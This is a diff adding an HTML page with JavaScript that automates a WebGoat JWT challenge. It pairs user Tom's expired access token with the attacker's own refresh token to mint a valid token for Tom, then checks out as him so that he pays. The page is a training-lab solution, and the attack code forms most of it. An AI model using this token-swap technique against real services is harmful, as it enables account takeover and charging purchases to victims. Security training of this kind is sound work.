@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JWT Refresh Token Attack - WebGoat</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            color: #333;
+        }
+        h1 {
+            color: #667eea;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .section {
+            margin: 20px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border-left: 4px solid #667eea;
+        }
+        .token-box {
+            background: #2d3748;
+            color: #68d391;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            word-break: break-all;
+            margin: 10px 0;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px 5px;
+            transition: transform 0.2s;
+            font-weight: bold;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        .success {
+            background: #48bb78;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            display: none;
+        }
+        .error {
+            background: #f56565;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            display: none;
+            color: white;
+        }
+        .info {
+            background: #4299e1;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            color: white;
+        }
+        .warning {
+            background: #ed8936;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            color: white;
+        }
+        .log-entry {
+            background: #fff;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+            border-left: 3px solid #4299e1;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .step-number {
+            background: #667eea;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .decoded-payload {
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            border: 2px solid #667eea;
+        }
+        pre {
+            background: #2d3748;
+            color: #68d391;
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+        }
+        .attack-flow {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            color: #856404;
+        }
+        .copy-btn {
+            background: #48bb78;
+            padding: 5px 15px;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 JWT Refresh Token Manipulation Attack</h1>
+        <div class="subtitle">Challenge: Make Tom pay for the books</div>
+
+        <div class="attack-flow">
+            <h3>🎯 Attack Strategy</h3>
+            <p><strong>Vulnerability:</strong> Server doesn't verify that the refresh token belongs to the user in the access token</p>
+            <ol>
+                <li>Use <strong>Tom's EXPIRED</strong> access token (from log) → Contains <code>user='Tom'</code></li>
+                <li>Use <strong>OUR VALID</strong> refresh token → Belongs to us</li>
+                <li>Server validates refresh token ✅ → Sees it's valid</li>
+                <li>Server issues new token for <strong>Tom</strong> (from access token)! ❌</li>
+                <li>We checkout as Tom → <strong>Tom pays!</strong> 💰</li>
+            </ol>
+        </div>
+
+        <div class="section">
+            <h3><span class="step-number">1</span>Tom's Token from Log</h3>
+            <div class="info">
+                Found in access log: <code>GET /refresh/checkout?token=...</code>
+            </div>
+            <div class="token-box" id="tomsToken">
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
+            </div>
+            <button onclick="decodeTomToken()">🔍 Decode Tom's Token</button>
+            <div class="decoded-payload" id="tomDecoded" style="display:none;"></div>
+        </div>
+
+        <div class="section">
+            <h3><span class="step-number">2</span>Get Your Refresh Token</h3>
+            <p>First, we need to login and get our own refresh token:</p>
+            <button onclick="login()">🔑 Login & Get Tokens</button>
+            <div id="loginSuccess" class="success"></div>
+            <div id="loginError" class="error"></div>
+            <div id="ourTokens" style="display:none;">
+                <p><strong>Your Access Token:</strong></p>
+                <div class="token-box" id="ourAccessToken"></div>
+                <p><strong>Your Refresh Token:</strong></p>
+                <div class="token-box" id="ourRefreshToken"></div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h3><span class="step-number">3</span>Execute Attack: Refresh Tom's Token</h3>
+            <div class="warning">
+                ⚠️ This uses Tom's expired access token + YOUR refresh token to get a NEW valid token for Tom!
+            </div>
+            <button onclick="attackRefreshToken()" id="attackBtn" disabled>⚡ Execute Attack</button>
+            <div id="attackSuccess" class="success"></div>
+            <div id="attackError" class="error"></div>
+            <div id="tomsNewToken" style="display:none;">
+                <p><strong>Tom's NEW Access Token:</strong></p>
+                <div class="token-box" id="tomNewTokenBox"></div>
+                <button onclick="decodeTomNewToken()" class="copy-btn">🔍 Decode</button>
+                <div class="decoded-payload" id="tomNewDecoded" style="display:none;"></div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h3><span class="step-number">4</span>Checkout as Tom</h3>
+            <p>Use Tom's new token to checkout and make him pay! 💰</p>
+            <button onclick="checkout()" id="checkoutBtn" disabled>🛒 Checkout (Tom Pays!)</button>
+            <div id="checkoutSuccess" class="success"></div>
+            <div id="checkoutError" class="error"></div>
+        </div>
+
+        <div class="section">
+            <h3>📝 Logs</h3>
+            <div id="logs"></div>
+        </div>
+    </div>
+
+    <script>
+        const BASE_URL = 'http://192.168.254.112:8001/WebGoat';
+        const TOMS_EXPIRED_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
+        
+        let myRefreshToken = null;
+        let myAccessToken = null;
+        let tomsNewAccessToken = null;
+
+        function log(message, type = 'info') {
+            const logs = document.getElementById('logs');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logs.insertBefore(entry, logs.firstChild);
+        }
+
+        function decodeJWT(token) {
+            try {
+                const parts = token.split('.');
+                const payload = parts[1];
+                const decoded = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
+                return JSON.parse(decoded);
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function decodeTomToken() {
+            const decoded = decodeJWT(TOMS_EXPIRED_TOKEN);
+            const elem = document.getElementById('tomDecoded');
+            elem.style.display = 'block';
+            elem.innerHTML = '<h4>Decoded Payload:</h4><pre>' + JSON.stringify(decoded, null, 2) + '</pre>';
+            elem.innerHTML += '<p><strong>Status:</strong> ❌ EXPIRED (exp: ' + new Date(decoded.exp * 1000).toLocaleString() + ')</p>';
+            elem.innerHTML += '<p><strong>User:</strong> ' + decoded.user + '</p>';
+            log('Decoded Tom\'s expired token - User: ' + decoded.user);
+        }
+
+        async function login() {
+            log('Attempting login...');
+            try {
+                const response = await fetch(`${BASE_URL}/login`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: 'webgoat',
+                        password: 'webgoat'
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Login failed: ' + response.status);
+                }
+
+                const data = await response.json();
+                myAccessToken = data.access_token;
+                myRefreshToken = data.refresh_token;
+
+                document.getElementById('loginSuccess').style.display = 'block';
+                document.getElementById('loginSuccess').textContent = '✅ Login successful! Got your tokens.';
+                
+                document.getElementById('ourTokens').style.display = 'block';
+                document.getElementById('ourAccessToken').textContent = myAccessToken;
+                document.getElementById('ourRefreshToken').textContent = myRefreshToken;
+                
+                document.getElementById('attackBtn').disabled = false;
+
+                log('✅ Login successful - Got refresh token');
+                
+            } catch (error) {
+                document.getElementById('loginError').style.display = 'block';
+                document.getElementById('loginError').textContent = '❌ Error: ' + error.message;
+                log('❌ Login failed: ' + error.message);
+            }
+        }
+
+        async function attackRefreshToken() {
+            if (!myRefreshToken) {
+                alert('Please login first!');
+                return;
+            }
+
+            log('🎯 Executing refresh token manipulation attack...');
+            
+            try {
+                const response = await fetch(`${BASE_URL}/JWT/refresh/newToken`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'Bearer ' + TOMS_EXPIRED_TOKEN,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        refresh_token: myRefreshToken
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Attack failed: ' + response.status);
+                }
+
+                const data = await response.json();
+                tomsNewAccessToken = data.access_token;
+
+                document.getElementById('attackSuccess').style.display = 'block';
+                document.getElementById('attackSuccess').innerHTML = '✅ <strong>ATTACK SUCCESSFUL!</strong> Got new token for Tom!';
+                
+                document.getElementById('tomsNewToken').style.display = 'block';
+                document.getElementById('tomNewTokenBox').textContent = tomsNewAccessToken;
+                
+                document.getElementById('checkoutBtn').disabled = false;
+
+                log('✅ Attack successful - Got new token for Tom!');
+                
+            } catch (error) {
+                document.getElementById('attackError').style.display = 'block';
+                document.getElementById('attackError').textContent = '❌ Error: ' + error.message;
+                log('❌ Attack failed: ' + error.message);
+            }
+        }
+
+        function decodeTomNewToken() {
+            const decoded = decodeJWT(tomsNewAccessToken);
+            const elem = document.getElementById('tomNewDecoded');
+            elem.style.display = 'block';
+            elem.innerHTML = '<h4>Decoded NEW Token:</h4><pre>' + JSON.stringify(decoded, null, 2) + '</pre>';
+            elem.innerHTML += '<p><strong>Status:</strong> ✅ VALID</p>';
+            elem.innerHTML += '<p><strong>User:</strong> ' + decoded.user + ' ← We can act as Tom!</p>';
+            log('Decoded Tom\'s NEW token - User: ' + decoded.user);
+        }
+
+        async function checkout() {
+            if (!tomsNewAccessToken) {
+                alert('Please execute the attack first!');
+                return;
+            }
+
+            log('🛒 Attempting checkout as Tom...');
+            
+            try {
+                const response = await fetch(`${BASE_URL}/JWT/refresh/checkout`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'Bearer ' + tomsNewAccessToken,
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                if (!response.ok) {
+                    throw new Error('Checkout failed: ' + response.status);
+                }
+
+                const data = await response.json();
+
+                document.getElementById('checkoutSuccess').style.display = 'block';
+                document.getElementById('checkoutSuccess').innerHTML = '🎉 <strong>SUCCESS!</strong> Tom is paying for the books!<br><pre>' + JSON.stringify(data, null, 2) + '</pre>';
+
+                log('🎉 Checkout successful - Tom paid for our books!');
+                
+            } catch (error) {
+                document.getElementById('checkoutError').style.display = 'block';
+                document.getElementById('checkoutError').textContent = '❌ Error: ' + error.message;
+                log('❌ Checkout failed: ' + error.message);
+            }
+        }
+
+        // Auto-decode Tom's token on load
+        window.onload = function() {
+            decodeTomToken();
+            log('Ready to attack! Click "Login & Get Tokens" to start.');
+        };
+    </script>
+</body>
+</html>
